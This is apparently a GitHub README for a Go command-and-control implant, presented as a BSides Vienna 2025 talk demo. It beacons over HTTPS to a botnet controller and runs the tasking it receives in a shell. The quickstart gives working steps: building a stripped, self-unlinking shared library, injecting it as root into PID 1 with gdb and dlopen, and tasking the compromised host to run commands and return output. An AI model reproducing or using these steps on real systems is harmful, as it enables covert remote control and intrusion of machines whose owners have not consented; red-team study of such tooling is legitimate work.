`anime_costume_cheese`
======================
HTTPS beacons in a loop without curl.

Beacons to [demobotnetcontroller](
https://github.com/magisterquis/demobotnetcontroller/) and passes tasking to
a shell.

Originally written as a demo for the talk Living Under the Land on Linux,
presented at BSides Vienna 2025.

For legal use only.

Features
--------
1.  Buildable as an injectable library with a constructor function or as a
    standalone program.
2.  Uses [`sneaky_remap`](https://github.com/magisterquis/sneaky_remap) on
    Linux.
3.  Reusable [beaconing library](./pkg/beaconer).
4.  Documented with clear, easy-to-use documentation.
5.  Unencumbered by tests (but one day...).

Quickstart
----------
1.  Set up [`demobotnetcontroller`](
    https://github.com/magisterquis/demobotnetcontroller/)
    ```sh
    # On the Botnet controller
    go install github.com/magisterquis/demobotnetcontroller@latest
    # go: downloading github.com/magisterquis/demobotnetcontroller v0.0.0-20251116191455-d12ab4f947e0
    # go: downloading github.com/magisterquis/curlrevshell v0.0.1-beta.8
    # go: downloading golang.org/x/sync v0.18.0
    # go: downloading golang.org/x/sys v0.38.0
    # go: downloading golang.org/x/tools v0.39.0
    demobotnetcontroller | jq
    # {
    #   "time": "2025-11-18T21:29:49.284596957+01:00",
    #   "level": "INFO",
    #   "msg": "Server starting",
    #   "fingerprint": "xTTVmYL39kmep6AbYey/IJMRA114Z5FAJf7oW52LB7w=",
    #   "address": "0.0.0.0:4433",
    #   "PID": 81795,
    #   "directory": "demobotnet",
    #   "prefix": "/bots/"
    # }
    ```
2.  Build the library.
    ```sh
    # On the Victim
    git clone https://github.com/magisterquis/anime_costume_cheese.git && cd anime_costume_cheese
    CGO_CFLAGS='-DSREM_CGO_START_FLAGS=SREM_SRS_UNLINK|SREM_SRS_RMELF' \
    go build \
          -trimpath \
          -buildmode c-shared \
          -ldflags '-w -s
                  -X main.Fingerprint=xTTVmYL39kmep6AbYey/IJMRA114Z5FAJf7oW52LB7w=
                  -X main.URL=https://10.114.0.5:4433/bots'
    file anime_costume_cheese
    # anime_costume_cheese: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=e3909d4921d79f958d92e8eaba2110713787c469, stripped
    ```
    Though, building somewhere not the victim is recommended.
3.  Inject the library into something.
    ```sh
    # On the Victim
    sudo gdb <<_eof
    attach 1
    print (void *)dlopen("$(pwd)/anime_costume_cheese", 2)
    _eof
    # ...snip...
    # 0x00007f8f1c699687 in ?? () from /lib/x86_64-linux-gnu/libc.so.6
    # (gdb) [New Thread 0x7f8f1b3ff6c0 (LWP 1517)]
    # [New Thread 0x7f8ecffff6c0 (LWP 1518)]
    # [New Thread 0x7f8ecf7fe6c0 (LWP 1519)]
    # [New Thread 0x7f8eceffd6c0 (LWP 1522)]
    # $1 = (void *) 0x55c0841488c0
    # ...snip...
    ```
4.  Task the injected library with demobotnetcontroller.
    ```sh
    # On the Botnet controller
    # Should get a log entry like
    # {
    #   "time": "2025-11-18T21:49:53.922221488+01:00",
    #   "level": "INFO",
    #   "msg": "New ID",
    #   "request": {
    #     "remote_address": "10.114.0.4:44892",
    #     "method": "GET",
    #     "host": "10.114.0.5:4433",
    #     "request_uri": "/bots/victim-uid-0-pid-1-206oigfpsjhv5",
    #     "user_agent": "Go-http-client/1.1"
    #   },
    #   "id": "victim-uid-0-pid-1-206oigfpsjhv5"
    # }
    echo 'ps awwwfux' >> victim-uid-0-pid-1-206oigfpsjhv5_tmp
    mv -v victim-uid-0-pid-1-206oigfpsjhv5_{tmp,task}
    # victim-uid-0-pid-1-206oigfpsjhv5_tmp -> victim-uid-0-pid-1-206oigfpsjhv5_task
    # Wait for output...
    cat victim-uid-0-pid-1-206oigfpsjhv5
    # ...snip...
    # root        1530  0.0  0.1   2680  1760 ?        S    20:55   0:00 ?
    # root        1531  0.0  0.3   6404  3860 ?        R    20:55   0:00  \_ ps awwwfux
    ```

Library Config
--------------
Library configuration takes the form of compile-time linker-settable variables,
as in the quickstart as well as one build tag.

### Linker-Settable variables
The following may be set at build-time.

Variable         | Default | Description
-----------------|---------|------------
main.Fingerprint | _none_  | TLS SHA256 fingerprint, as for curl's [`--pinnedpubkey`](https://curl.se/docs/manpage.html#--pinnedpubkey) (required)
main.ID          | _none_  | Bot ID, unset to auto-generate
main.URL         | _none_  | [Demobotnetcontroller](https://github.com/magisterquis/demobotnetcontroller)'s URL (required)
main.Interval    | `15s`   | Beacon internal
main.LogLevel    | _unset_ | Log level, unset for no logs, or `DEBUG` or `INFO` for log output to stderr

A fully-configured set of variables might look like
```sh
go build -ldflags '
        -X main.Fingerprint=xTTVmYL39kmep6AbYey/IJMRA114Z5FAJf7oW52LB7w=
        -X main.ID=kittens
        -X main.URL=https://10.114.0.5:4433/bots
        -X main.Interval=1m3s
        -X main.LogLevel=DEBUG'
```
Though in practice `main.ID` is often better left unset.

### `sneaky_remap`
On Linux, [`sneaky_remap`](https://github.com/magisterquis/sneaky_remap) is
enabled by default.  It may be disabled by supplying `-tags no_sneaky_remap` to
`go build`.

When not disabled, [`sneaky_remap`](
https://github.com/magisterquis/sneaky_remap) itself may be configured as
described in its [documentation](
https://github.com/magisterquis/sneaky_remap/blob/master/README.md#compile-time-configuration-go)

Standalone Program
------------------
A standalone program with the same name as the library is available as well.

Build with
```sh
go build ./cmd/anime_costume_cheese
```

Compile-time config is the same as the [Linker-Settable
Variables](#linker-settable-variables) except `main.LogLevel`, but run-time
flags are also available:
```
Usage: anime_costume_cheese [options]

HTTPS beacons in a loop without curl

Client for https://github.com/magisterquis/demobotnetcontroller

Options:
  -debug
    	Enable debug logging
  -fingerprint fingerprint
    	TLS fingerprint
  -id string
    	Bot ID (unset to autogenerate)
  -interval interval
    	Beacon interval (default "15s")
  -max-runtime duration
    	Maximum run duration
  -url URL
    	Demobotnetcontroller URL, less ID
```
